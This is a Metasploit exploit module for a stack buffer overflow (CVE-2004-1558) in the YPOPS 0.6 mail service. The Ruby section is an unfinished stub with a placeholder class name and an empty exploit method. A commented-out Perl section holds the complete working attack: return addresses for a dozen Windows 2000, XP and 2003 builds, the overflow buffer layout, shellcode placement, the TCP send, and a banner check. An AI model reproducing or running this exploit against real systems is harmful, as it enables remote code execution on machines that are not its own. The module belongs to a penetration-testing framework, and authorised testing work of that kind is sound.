require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'YPOPS 0.6 Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the YPOPS POP3
				service.

				This is a classic stack overflow for YPOPS version 0.6.
				Possibly Affected version 0.5, 0.4.5.1, 0.4.5. Eip point to
				jmp ebx opcode in ws_32.dll
					
			},
			'Author'         => [ '<acaro@jervus.it>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '10367'],
					[ 'CVE', '2004-1558'],
					[ 'BID', '11256'],
					[ 'URL', 'http://www.securiteam.com/windowsntfocus/5GP0M2KE0S.html'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1200,
					'BadChars' => "\x00\x25",
					'MinNops'  => 106,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Sep 27 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ypops_overflow1;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	'Name'    => 'YPOPS 0.6 Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' => [ '<acaro [at] jervus.it>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 25],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'    => 1200,
		'MinNops'  => 106,
		'BadChars' =>"\x00\x25",
	  },
	  
	

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the YPOPS 
	POP3 service. 
	
	This is a classic stack overflow for YPOPS version 0.6.
	Possibly Affected version 0.5, 0.4.5.1, 0.4.5.
	Eip point to jmp ebx opcode in ws_32.dll 

}),

	'Refs'  =>
	  [    
	  	['OSVDB', '10367'],
		['CVE',   '2004-1558'],
		['BID',   '11256'],
		['URL',   'http://www.securiteam.com/windowsntfocus/5GP0M2KE0S.html'],
	  ],
	  
	'Targets' =>
	  [
		['Windows 2000 SP0 Italian', 503, 0x74fe6113], #jmp ebx ws2_32.dll
		['Windows 2000 Advanced Server Italian SP4', 503, 0x74fe16e2], #call ebx ws_32.dll
		['Windows 2000 Advanced Server SP3 English', 503, 0x74fe22f3], #jmp ebx ws2_32.dll
		['Windows 2000 SP0 English', 503, 0x75036113 ], #jmp ebx ws2_32.dll
		['Windows 2000 SP1 English', 503, 0x750317b2 ], #call ebx ws2_32.dll
		['Windows 2000 SP2 English', 503, 0x7503435b ], #jmp ebx ws2_32.dll
		['Windows 2000 SP3 English', 503, 0x750322f3 ], #jmp ebx ws2_32.dll
		['Windows 2000 SP4 English', 503, 0x750316e2 ], #call ebx ws2_32.dll
		['Windows XP SP0-SP1 English', 503, 0x71ab1636 ], #call ebx ws2_32.dll
		['Windows XP SP2 English', 503, 0x71ab773b ], #jmp ebx ws2_32.dll
		['Windows 2003 SP0 English', 503, 0x71c04202 ], #call ebx ws2_32.dll
		['Windows 2003 SP1 English', 503, 0x71c05fb0 ], #call ebx ws2_32.dll
	  ],
	'Keys' => ['ypops'],

	'DisclosureDate' => 'Sep 27 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}

	my $banner = $s->Recv(-1, 5);
	$banner =~ s/\r|\n//g;

	$s->Close;

	if ($banner =~ /YahooPOPs! Simple Mail Transfer Service Ready/)
	{
		$self->PrintLine("[*] Vulnerable SMTP server: $banner");
		return $self->CheckCode('Detected');
	}

	$self->PrintLine("[*] Unknown FTP server: $banner");
	return $self->CheckCode('Safe');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];
	my $pattern = ("X" x ($target->[1] - length($shellcode)));
	$pattern .= $shellcode;
	$pattern .= pack("V", $target->[2]);

	my $request = $pattern . "\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp ebx at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	  
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Close();
	return;
}

=end


end
end	
